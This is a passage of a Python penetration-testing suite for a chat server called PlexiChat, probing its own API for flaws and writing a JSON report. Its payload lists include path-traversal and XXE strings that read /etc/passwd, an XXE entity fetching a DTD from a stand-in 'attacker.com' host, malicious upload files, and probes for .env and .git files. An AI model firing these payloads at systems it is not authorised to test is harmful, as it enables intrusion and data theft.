                                    data={'test': 'data'},
                                    expected_status=None,
                                    timeout=5
                                )
                                # Add the override header
                                headers = self.get_headers()
                                headers[override_header] = 'DELETE'

                                override_response = self.session.post(
                                    f"{self.config.base_url}{endpoint}",
                                    headers=headers,
                                    json={'test': 'data'},
                                    timeout=5
                                )

                                if override_response.status_code != response.status_code:
                                    self.add_result(
                                        test_name, TestType.INPUT_VALIDATION, Severity.MEDIUM,
                                        f"HTTP method override possible with {override_header} on {endpoint}",
                                        {
                                            'endpoint': endpoint,
                                            'override_header': override_header,
                                            'original_status': response.status_code,
                                            'override_status': override_response.status_code
                                        },
                                        False, True
                                    )
                            except:
                                pass

                    # Log successful method responses for analysis
                    if response.status_code in [200, 201, 202]:
                        self.add_result(
                            test_name, TestType.API_DISCOVERY, Severity.INFO,
                            f"Method {method} allowed on {endpoint}",
                            {
                                'method': method,
                                'endpoint': endpoint,
                                'status': response.status_code,
                                'content_length': len(response.text)
                            },
                            True, False
                        )

                except:
                    pass

    # =============================================================================
    # RATE LIMITING & DOS TESTS
    # =============================================================================

    def test_rate_limiting(self):
        """Test rate limiting implementation"""
        test_name = "Rate Limiting"

        def make_parallel_requests():
            results = []
            for i in range(100):
                try:
                    response = self.make_request('GET', '/users/me')
                    results.append(response.status_code)
                except:
                    results.append('error')
            return results

        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = [executor.submit(make_parallel_requests) for _ in range(5)]

            rate_limited = False
            for future in as_completed(futures):
                results = future.result()
                if 429 in results:
                    rate_limited = True
                    break

            if not rate_limited:
                self.add_result(
                    test_name, TestType.RATE_LIMITING, Severity.MEDIUM,
                    "Rate limiting not detected",
                    {'requests': 500, 'rate_limited': rate_limited},
                    False, True
                )
            else:
                self.add_result(
                    test_name, TestType.RATE_LIMITING, Severity.LOW,
                    "Rate limiting implemented",
                    {'requests': 500, 'rate_limited': rate_limited},
                    True, False
                )

    def test_dos_conditions(self):
        """Test denial of service conditions"""
        test_name = "Denial of Service"

        # Test large payloads
        large_payloads = [
            {'content': 'A' * 1000000},  # 1MB payload
            {'username': 'A' * 10000},
            {'email': 'A' * 1000 + '@test.com'},
            {'data': base64.b64encode(b'A' * 1000000).decode()}
        ]

        for payload in large_payloads:
            try:
                start_time = time.time()
                response = self.make_request('POST', '/messages/send', data=payload)
                duration = time.time() - start_time

                if duration > 5:  # Response took too long
                    self.add_result(
                        test_name, TestType.RATE_LIMITING, Severity.MEDIUM,
                        f"Slow response for large payload: {duration:.2f}s",
                        {'payload_size': len(str(payload)), 'duration': duration},
                        False, True
                    )

            except:
                pass

    # =============================================================================
    # FILE UPLOAD TESTS
    # =============================================================================

    def test_file_upload_vulnerabilities(self):
        """Test file upload security"""
        test_name = "File Upload Security"

        # Test file extensions
        malicious_files = [
            {'filename': 'test.php', 'content': '<?php echo "malicious"; ?>'},
            {'filename': 'test.jsp', 'content': '<% out.println("malicious"); %>'},
            {'filename': 'test.py', 'content': 'import os; os.system("echo malicious")'},
            {'filename': 'test.sh', 'content': '#!/bin/bash\necho "malicious"'},
            {'filename': 'test.exe', 'content': b'\x4d\x5a\x90\x00'},  # PE header
            {'filename': 'test.html', 'content': '<script>alert("xss")</script>'},
            {'filename': '../../../etc/passwd', 'content': 'malicious'},
            {'filename': '.htaccess', 'content': 'RewriteRule .* malicious.php'}
        ]

        for file_data in malicious_files:
            try:
                # This would need multipart form data implementation
                # For now, testing filename validation
                response = self.make_request('POST', '/files/upload', data=file_data)

                if response.status_code == 200:
                    upload_response = response.json()
                    if 'url' in upload_response:
                        # Try to access uploaded file
                        file_url = upload_response['url']
                        file_response = requests.get(file_url, timeout=5)

                        if file_response.status_code == 200:
                            self.add_result(
                                test_name, TestType.FILE_UPLOAD, Severity.HIGH,
                                f"Potentially dangerous file uploaded: {file_data['filename']}",
                                {'filename': file_data['filename'], 'url': file_url},
                                False, True
                            )

            except:
                pass

    # =============================================================================
    # ERROR HANDLING & INFORMATION DISCLOSURE
    # =============================================================================

    def test_error_handling(self):
        """Test error handling and information disclosure"""
        test_name = "Error Handling"

        # Test various error conditions
        error_tests = [
            ('GET', '/users/999999', 404),  # Non-existent user
            ('GET', '/messages/-1', 400),   # Negative ID
            ('POST', '/messages/send', {}),  # Missing required fields
            ('PUT', '/users/me', {'email': 'invalid-email'}),  # Invalid email
            ('GET', '/admin', 403),  # Unauthorized access
        ]

        for method, endpoint, expected_status in error_tests:
            try:
                response = self.make_request(method, endpoint, expected_status=None)

                # Check for information disclosure in error messages
                error_indicators = [
                    'traceback', 'stack trace', 'mysql', 'postgresql', 'sqlite',
                    'debug', 'line ', 'file ', 'exception', 'error in',
                    '/var/www', '/app/', '/home/', 'C:\\', 'D:\\'
                ]

                response_text = response.text.lower()
                for indicator in error_indicators:
                    if indicator in response_text:
                        self.add_result(
                            test_name, TestType.ERROR_HANDLING, Severity.MEDIUM,
                            f"Information disclosure in error response for {endpoint}",
                            {'endpoint': endpoint, 'error': response.text[:200]},
                            False, True
                        )
                        break

            except:
                pass

    # =============================================================================
    # MAIN EXECUTION
    # =============================================================================

    def run_all_tests(self):
        """Run all security tests"""
        logger = self.setup_logging()
        logger.info("Starting comprehensive security test suite...")

        # Setup test user
        try:
            self.test_user = self.generate_test_user()
            response = self.make_request('POST', '/auth/register', data=self.test_user, auth=False)
            if response.status_code == 201:
                login_response = self.make_request('POST', '/auth/login',
                                                 data={'username': self.test_user['username'],
                                                       'password': self.test_user['password']},
                                                 auth=False)
                if login_response.status_code == 200:
                    self.auth_token = login_response.json().get('access_token')
                    self.user_id = login_response.json().get('user', {}).get('id')
        except Exception as e:
            logger.error(f"Failed to setup test user: {e}")

        # Run all test suites in logical order
        test_suites = [
            # Discovery and reconnaissance
            self.test_api_discovery,
            self.test_http_methods,

            # Authentication and authorization
            self.test_authentication_bypass,
            self.test_weak_password_policy,
            self.test_brute_force_protection,
            self.test_session_management,
            self.test_privilege_escalation,

            # Input validation and injection attacks
            self.test_sql_injection,
            self.test_xss_injection,
            self.test_command_injection,

            # Business logic and application security
            self.test_mass_assignment,
            self.test_file_upload_vulnerabilities,
            self.test_error_handling,

            # Infrastructure and availability
            self.test_rate_limiting,
            self.test_dos_conditions,

            # Additional comprehensive tests
            self.test_all_discovered_endpoints,
            self.test_security_headers,
            self.test_information_disclosure,
            self.test_csrf_protection
        ]

        for test_suite in test_suites:
            try:
                logger.info(f"Running {test_suite.__name__}...")
                test_suite()
            except Exception as e:
                logger.error(f"Error in {test_suite.__name__}: {e}")

        # Generate report
        self.generate_report()

        return self.results

    def test_all_discovered_endpoints(self):
        """Test all discovered endpoints with comprehensive attack vectors"""
        test_name = "Comprehensive Endpoint Testing"

        discovered = getattr(self, 'discovered_endpoints', [])
        if not discovered:
            return

        # Test each discovered endpoint with various attack vectors
        for endpoint in discovered:
            # Test for path traversal
            path_traversal_payloads = [
                '../../../etc/passwd',
                '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
                '....//....//....//etc/passwd',
                '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
                '..%252f..%252f..%252fetc%252fpasswd'
            ]

            for payload in path_traversal_payloads:
                try:
                    response = self.make_request('GET', f"{endpoint}?file={payload}", timeout=5)
                    if 'root:' in response.text or 'localhost' in response.text:
                        self.add_result(
                            test_name, TestType.INPUT_VALIDATION, Severity.CRITICAL,
                            f"Path traversal vulnerability at {endpoint}",
                            {'payload': payload, 'endpoint': endpoint},
                            False, True
                        )
                except:
                    pass

            # Test for LDAP injection
            ldap_payloads = ['*', '*)(&', '*))%00', '*()|%26']
            for payload in ldap_payloads:
                try:
                    response = self.make_request('GET', f"{endpoint}?search={payload}", timeout=5)
                    if 'ldap' in response.text.lower() or 'directory' in response.text.lower():
                        self.add_result(
                            test_name, TestType.INPUT_VALIDATION, Severity.HIGH,
                            f"LDAP injection vulnerability at {endpoint}",
                            {'payload': payload, 'endpoint': endpoint},
                            False, True
                        )
                except:
                    pass

            # Test for XML injection
            xml_payloads = [
                '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
                '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">%remote;]>',
                '<![CDATA[<script>alert("XSS")</script>]]>'
            ]

            for payload in xml_payloads:
                try:
                    response = self.make_request('POST', endpoint, data={'xml': payload}, timeout=5)
                    if 'root:' in response.text or 'ENTITY' in response.text:
                        self.add_result(
                            test_name, TestType.INPUT_VALIDATION, Severity.HIGH,
                            f"XML injection vulnerability at {endpoint}",
                            {'payload': payload, 'endpoint': endpoint},
                            False, True
                        )
                except:
                    pass

    def test_security_headers(self):
        """Test for security headers"""
        test_name = "Security Headers"

        discovered = getattr(self, 'discovered_endpoints', ['/'])

        for endpoint in discovered[:5]:  # Test first 5 endpoints
            try:
                response = self.make_request('GET', endpoint, timeout=5)
                headers = response.headers

                # Check for missing security headers
                security_headers = {
                    'X-Content-Type-Options': 'nosniff',
                    'X-Frame-Options': ['DENY', 'SAMEORIGIN'],
                    'X-XSS-Protection': '1; mode=block',
                    'Strict-Transport-Security': 'max-age=',
                    'Content-Security-Policy': 'default-src',
                    'Referrer-Policy': 'strict-origin'
                }

                for header, expected in security_headers.items():
                    if header not in headers:
                        self.add_result(
                            test_name, TestType.INFORMATION_DISCLOSURE, Severity.MEDIUM,
                            f"Missing security header: {header} at {endpoint}",
                            {'header': header, 'endpoint': endpoint},
                            False, True
                        )
                    elif isinstance(expected, list):
                        if not any(exp in headers[header] for exp in expected):
                            self.add_result(
                                test_name, TestType.INFORMATION_DISCLOSURE, Severity.LOW,
                                f"Weak security header: {header} at {endpoint}",
                                {'header': header, 'value': headers[header], 'endpoint': endpoint},
                                False, True
                            )
                    elif expected not in headers.get(header, ''):
                        self.add_result(
                            test_name, TestType.INFORMATION_DISCLOSURE, Severity.LOW,
                            f"Weak security header: {header} at {endpoint}",
                            {'header': header, 'value': headers.get(header), 'endpoint': endpoint},
                            False, True
                        )

                # Check for information disclosure headers
                disclosure_headers = ['Server', 'X-Powered-By', 'X-AspNet-Version', 'X-AspNetMvc-Version']
                for header in disclosure_headers:
                    if header in headers:
                        self.add_result(
                            test_name, TestType.INFORMATION_DISCLOSURE, Severity.LOW,
                            f"Information disclosure header: {header} at {endpoint}",
                            {'header': header, 'value': headers[header], 'endpoint': endpoint},
                            False, True
                        )

            except:
                pass

    def test_information_disclosure(self):
        """Test for information disclosure vulnerabilities"""
        test_name = "Information Disclosure"

        # Test for common information disclosure endpoints
        info_endpoints = [
            '/.env', '/config.json', '/package.json', '/composer.json',
            '/web.config', '/.htaccess', '/robots.txt', '/sitemap.xml',
            '/.git/config', '/.svn/entries', '/backup.sql', '/database.sql',
            '/phpinfo.php', '/info.php', '/test.php', '/debug.php',
            '/server-status', '/server-info', '/status', '/health'
        ]

        for endpoint in info_endpoints:
            try:
                response = self.make_request('GET', endpoint, timeout=5)
                if response.status_code == 200:
                    # Check for sensitive information patterns
                    sensitive_patterns = [
                        'password', 'secret', 'key', 'token', 'api_key',
                        'database', 'connection', 'config', 'env',
                        'version', 'debug', 'error', 'stack trace'
                    ]

                    response_text = response.text.lower()
                    for pattern in sensitive_patterns:
                        if pattern in response_text:
                            self.add_result(
                                test_name, TestType.INFORMATION_DISCLOSURE, Severity.MEDIUM,
                                f"Information disclosure at {endpoint}",
                                {
                                    'endpoint': endpoint,
                                    'pattern': pattern,
                                    'response_preview': response.text[:200]
                                },
                                False, True
                            )
                            break

            except:
                pass

    def test_csrf_protection(self):
        """Test for CSRF protection"""
        test_name = "CSRF Protection"

        # Test state-changing endpoints
        csrf_endpoints = [
            ('POST', '/api/v1/users/me', {'username': 'test'}),
            ('DELETE', '/api/v1/users/me', {}),
            ('POST', '/api/v1/messages/send', {'content': 'test', 'to': 'test'}),
            ('PUT', '/api/v1/users/me', {'display_name': 'test'})
        ]

        for method, endpoint, data in csrf_endpoints:
            try:
                # Make request without CSRF token
                headers = self.get_headers()
                # Remove potential CSRF headers
                csrf_headers = ['X-CSRF-Token', 'X-CSRFToken', 'CSRF-Token', 'X-Requested-With']
                for csrf_header in csrf_headers:
                    headers.pop(csrf_header, None)

                response = self.session.request(
                    method=method,
                    url=f"{self.config.base_url}{endpoint}",
                    headers=headers,
                    json=data,
                    timeout=5
                )

                # If request succeeds without CSRF protection, it's vulnerable
                if response.status_code in [200, 201, 202]:
                    self.add_result(
                        test_name, TestType.CSRF, Severity.MEDIUM,
                        f"Missing CSRF protection at {endpoint}",
                        {
                            'endpoint': endpoint,
                            'method': method,
                            'status': response.status_code
                        },
                        False, True
                    )

            except:
                pass

    def generate_report(self):
        """Generate comprehensive security report"""
        report = {
            'summary': {
                'total_tests': len(self.results),
                'passed': len([r for r in self.results if r.passed]),
                'failed': len([r for r in self.results if not r.passed]),
                'vulnerabilities': len([r for r in self.results if r.vulnerability_found]),
                'critical': len([r for r in self.results if r.severity == Severity.CRITICAL]),
                'high': len([r for r in self.results if r.severity == Severity.HIGH]),
                'medium': len([r for r in self.results if r.severity == Severity.MEDIUM]),
                'low': len([r for r in self.results if r.severity == Severity.LOW])
            },
            'vulnerabilities': [
                {
                    'test_name': r.test_name,
                    'type': r.test_type.value,
                    'severity': r.severity.value,
                    'description': r.description,
                    'evidence': r.evidence,
                    'timestamp': r.timestamp.isoformat()
                }
                for r in self.results if r.vulnerability_found
            ],
            'all_results': [
                {
                    'test_name': r.test_name,
                    'type': r.test_type.value,
                    'severity': r.severity.value,
                    'description': r.description,
                    'passed': r.passed,
                    'vulnerability_found': r.vulnerability_found,
                    'timestamp': r.timestamp.isoformat()
                }
                for r in self.results
            ]
        }

        with open(self.config.report_file, 'w') as f:
            json.dump(report, f, indent=2)

# =============================================================================
# UTILITY FUNCTIONS
# =============================================================================

def print_banner():
    """Print security testing banner"""
    banner = """
    ?????????????????????????????????????????????????????????????????????????
    ?                                                                       ?
    ?   ??????? ????????????   ?????????????????????????????????????      ?
    ?   ?????????????????????  ?????????????????????????????????????      ?
    ?   ??????????????  ?????? ???   ???   ??????  ????????   ???         ?
    ?   ??????? ??????  ??????????   ???   ??????  ????????   ???         ?
    ?   ???     ??????????? ??????   ???   ????????????????   ???         ?
    ?   ???     ???????????  ?????   ???   ????????????????   ???         ?
    ?                                                                       ?
    ?   PlexiChat Advanced Security Testing Suite v2.0.0                   ?
    ?   Comprehensive penetration testing framework                       ?
    ?                                                                       ?
    ?????????????????????????????????????????????????????????????????????????
    """
    print(banner)

def check_server_health(base_url: str) -> bool:
    """Check if the server is running"""
    try:
        # Try multiple endpoints to check server health
        endpoints = ["/health", "/", "/docs", "/api/v1"]
        for endpoint in endpoints:
            try:
                response = requests.get(f"{base_url}{endpoint}", timeout=5)
                # Any HTTP response (including errors) indicates server is running
                if response.status_code in [200, 404, 500, 502, 503]:
                    return True
            except:
                continue
        return False
    except:
        return False

def main():
    """Main execution function"""
    print_banner()

    # Configuration
    config = TestConfig()

    # Check server health
    if not check_server_health(config.base_url):
        print(f"[ERROR] Server not responding at {config.base_url}")
        print("Please start the PlexiChat server before running tests.")
        return

    print("[OK] Server is running - starting security tests...")

    # Run security tests
    suite = SecurityTestSuite(config)
    results = suite.run_all_tests()

    # Print summary
    print("\n" + "="*80)
    print("SECURITY TEST SUMMARY")
    print("="*80)

    critical_vulns = [r for r in results if r.severity == Severity.CRITICAL and r.vulnerability_found]
    high_vulns = [r for r in results if r.severity == Severity.HIGH and r.vulnerability_found]
    medium_vulns = [r for r in results if r.severity == Severity.MEDIUM and r.vulnerability_found]

    print(f"Total tests run: {len(results)}")
    print(f"Critical vulnerabilities: {len(critical_vulns)}")
    print(f"High vulnerabilities: {len(high_vulns)}")
    print(f"Medium vulnerabilities: {len(medium_vulns)}")
    print(f"Report saved to: {config.report_file}")

    if critical_vulns:
        print("\n? CRITICAL VULNERABILITIES FOUND:")
        for vuln in critical_vulns:
            print(f"  - {vuln.description}")

    if high_vulns:
        print("\n? HIGH SEVERITY VULNERABILITIES:")
        for vuln in high_vulns:
            print(f"  - {vuln.description}")

if __name__ == "__main__":
    main()